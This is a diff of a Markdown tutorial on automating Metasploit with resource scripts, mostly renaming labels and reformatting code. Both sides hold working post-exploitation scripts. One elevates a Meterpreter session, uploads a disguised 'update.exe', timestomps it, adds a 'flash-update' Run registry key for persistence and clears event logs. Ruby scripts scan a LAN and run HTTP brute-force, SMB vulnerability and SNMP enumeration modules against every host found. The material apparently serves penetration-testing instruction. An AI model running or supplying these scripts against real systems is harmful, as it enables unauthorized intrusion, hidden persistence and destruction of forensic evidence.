@@ -84,7 +84,7 @@
 
 <br />
 
-- **Resource file to start one handle (makerc)::**`[script: handler.rc]`<br />
+- **Resource file to start one handler (makerc)::**`[script: handler.rc]`<br />
 
 ```
    kali > msfconsole
@@ -128,19 +128,19 @@
 ## RESOURCE SCRIPTS IN POST EXPLOITATION
 <blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time.</blockquote>
 
-- **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[script.rc]`<br />
+- **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[script: post.rc]`<br />
 
 ```
-getprivs
-getsystem
-screenshot
-migrate -n wininit.exe
-use post/windows/gather/enum_applications
-run
-use post/multi/recon/local_exploit_suggester
-run
+   getprivs
+   getsystem
+   screenshot
+   migrate -n wininit.exe
+      use post/windows/gather/enum_applications
+      run
+      use post/multi/recon/local_exploit_suggester
+      run
 ```
-`[run] meterpreter >` resource /root/script.rc
+`[run] meterpreter >` resource /root/post.rc
 
 <br /><br />
 
@@ -149,14 +149,14 @@ run
 - **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[persistence.rc]`<br />
 
 ```
-getprivs
-getsystem
-migrate -n explorer.exe
-upload update.exe %temp%\\update.exe
-timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
-reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
-scheduleme -m 10 -c "%temp%\\update.exe"
-clearev
+   getprivs
+   getsystem
+   migrate -n explorer.exe
+      upload update.exe %temp%\\update.exe
+      timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
+         reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
+      scheduleme -m 10 -c "%temp%\\update.exe"
+   clearev
 ```
 `[run] meterpreter >` resource /root/persistence.rc
 
@@ -164,7 +164,7 @@ clearev
 
 <blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using SETG (global variable declarations) to configurate all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The next rc script will run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>
 
-- **Using SETG global variable to config auxiliary(s) modules options::**`[http_brute.rc]`<br />
+- **Using SETG global variable to config auxiliary(s) modules options::**`[script: http_brute.rc]`<br />
 
 ```
 setg THREADS 15
@@ -194,16 +194,16 @@ unsetg RHOSTS THREADS
 ## RESOURCE SCRIPTS IN AutoRunScript
 <blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole 'AutoRunScript' handler flag, for this to work we need to define a global variable (setg RESOURCE /root/gather.rc) to call our resource script at session creation.</blockquote>
 
-- **RC::Post-Exploit::Script::Gather::**`[gather.rc]`<br />
+- **RC::Post-Exploit::Script::Gather::**`[script: gather.rc]`<br />
 
 ```
-sysinfo
-getuid
-services
-sessions -v
+   sysinfo
+   getuid
+   services
+      sessions -v
 ```
 
-- **RC::AutoRunScript::Handler::**`[handler.rc]`<br />
+- **RC::AutoRunScript::Handler::**`[script: post_handler.rc]`<br />
 
 ```
 setg RESOURCE /root/gather.rc
@@ -218,7 +218,7 @@ setg RESOURCE /root/gather.rc
 
 unsetg RESOURCE
 ```
-`[run]` msfconsole -r /root/handler.rc
+`[run]` msfconsole -r /root/post_handler.rc
 
 <br /><br />
 
@@ -240,7 +240,7 @@ unsetg RESOURCE
 ## USING RUBY IN RC (ERB scripting)
 <blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple msfconsole or meterpreter commands together with ruby syntax or metasploit APIs.</blockquote>
 
-- **Running ruby code inside resource files::**`[template.rc]`<br />
+- **Running ruby code inside resource files::**`[script: template.rc]`<br />
 
 ```
 <ruby>
@@ -250,17 +250,12 @@ unsetg RESOURCE
        This Metasploit RC file can be used to automate the exploitation process.
        In this example we are just checking msfdb connection status, list database
        hosts, services and export the contents of database to template.xml local file.
-
-    Usage:
-       ./msfconsole -r template.rc
-
     Author:
        r00t-3xp10it  <pedroubuntu10[at]hotmail.com>
     |
     print_line(help)
     Rex::sleep(1.5)
 
-       # checking database contents
        print_good("checking database connection")
        Rex::sleep(2)
        run_single("db_status")
@@ -271,8 +266,7 @@ unsetg RESOURCE
        Rex::sleep(2)
        run_single("hosts")
 
-   # exporting database to local file
-   print_good("exporting database to: template.xml")
+   print_warning("exporting database to: template.xml")
    Rex::sleep(1.5)
    run_single("db_export -f xml template.xml")
 
@@ -284,7 +278,7 @@ unsetg RESOURCE
 
 <blockquote>The next resource script uses db_nmap metasploit core command to populate the msfdb database with hosts (address), then the ruby function will check what hosts has been capture and run 3 post-exploitation modules againts all hosts stored inside the msfdb database.</blockquote>
 
-- **Scan local lan with nmap and run auxiliary(s)::**`[http_title.rc]`<br />
+- **Scan local lan with nmap and run auxiliary(s)::**`[script: http_title.rc]`<br />
 
 ```
 db_nmap -sV -Pn -T4 -p 80 --open --reason 192.168.1.0/24
@@ -293,13 +287,13 @@ services
    <ruby>
      xhost = framework.db.hosts.map(&:address).join(' ')
            run_single("setg RHOSTS #{xhost}")
-           print_good("###### Running ruby code inside resource files ######")
+           print_good("######### http title auxiliary #########")
            run_single("use auxiliary/scanner/http/title")
            run_single("exploit")
            print_good("######### dir_scanner auxiliary #########")
            run_single("use auxiliary/scanner/http/dir_scanner")
            run_single("exploit")
-           print_good("######### http_login auxiliary #########")
+           print_good("######### http_login auxiliary ##########")
            run_single("use auxiliary/scanner/http/http_login")
            run_single("exploit")
    </ruby>
@@ -312,7 +306,7 @@ unsetg RHOSTS
 
 <blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system.</blockquote>
 
-- **Run auxiliary/exploit modules based on database (targets) ports found::**`[exploiter.rc]`<br />
+- **Run auxiliary/exploit modules based on database (targets) ports found::**`[script: recon.rc]`<br />
 
 ```
 db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24
@@ -353,39 +347,42 @@ services
 
 unsetg RHOSTS
 ```
-`[run]` msfconsole -r /root/exploiter.rc
+`[run]` msfconsole -r /root/recon.rc
 
 <br /><br />
 
-- **snmp_enum::post::exploitation::**
+- **snmp_enum::post::exploitation::**`[script: snmp_enum.rc]`<br />
 
-        echo 'setg RHOSTS 192.168.1.71 192.168.1.254' > snmp_enum.rc
-        echo '<ruby>' >> snmp_enum.rc
-        echo '   print_line("")' >> snmp_enum.rc
-        echo '   print_status("Please wait, checking if RHOSTS are set globally.")' >> snmp_enum.rc
-        echo "      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')" >> snmp_enum.rc
-        echo '         print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")' >> snmp_enum.rc
-        echo '         return nil' >> snmp_enum.rc
-        echo '      end' >> snmp_enum.rc
-        echo '' >> snmp_enum.rc
-        echo '         # Using nmap to populate metasploit database (db_nmap)' >> snmp_enum.rc
-        echo '         print_good("RHOSTS set globally [ OK ] running scans.")' >> snmp_enum.rc
-        echo "            run_single(\"db_nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}\")" >> snmp_enum.rc
-        echo "            # Displays msf database results stored into 'services' and 'vulns'" >> snmp_enum.rc 
-        echo '            run_single("services")' >> snmp_enum.rc
-        echo '            run_single("vulns")' >> snmp_enum.rc
-        echo '' >> snmp_enum.rc
-        echo '         print_good("Please wait, running msf auxiliary modules.")' >> snmp_enum.rc
-        echo '      run_single("use auxiliary/scanner/snmp/snmp_enum")' >> snmp_enum.rc
-        echo '      run_single("exploit")' >> snmp_enum.rc
-        echo '      run_single("use auxiliary/scanner/snmp/snmp_enumusers")' >> snmp_enum.rc
-        echo '      run_single("exploit")' >> snmp_enum.rc
-        echo '      run_single("use auxiliary/scanner/snmp/snmp_enumshares")' >> snmp_enum.rc
-        echo '      run_single("exploit")' >> snmp_enum.rc
-        echo '</ruby>' >> snmp_enum.rc
-        echo 'unsetg RHOSTS' >> snmp_enum.rc
+```
+setg RHOSTS 192.168.1.71 192.168.1.254
 
-     `[run]` msfconsole -r /root/script.rc
+   <ruby>
+      print_line("")
+      print_status("Please wait, checking if RHOSTS are set globally.")
+      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
+         print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")
+         return nil
+      end
+
+         # Using nmap to populate metasploit database (db_nmap)
+         print_good("RHOSTS set globally [ OK ] running scans.")
+            run_single(\"db_nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}\")
+            # Displays msf database results stored into 'services' and 'vulns'
+            run_single("services")
+            run_single("vulns")
+
+      print_good("Please wait, running msf auxiliary modules.")
+      run_single("use auxiliary/scanner/snmp/snmp_enum")
+      run_single("exploit")
+      run_single("use auxiliary/scanner/snmp/snmp_enumusers")
+      run_single("exploit")
+      run_single("use auxiliary/scanner/snmp/snmp_enumshares")
+      run_single("exploit")
+   </ruby>
+
+unsetg RHOSTS
+```
+`[run]` msfconsole -r /root/snmp_enum.rc
 
 <br />
 
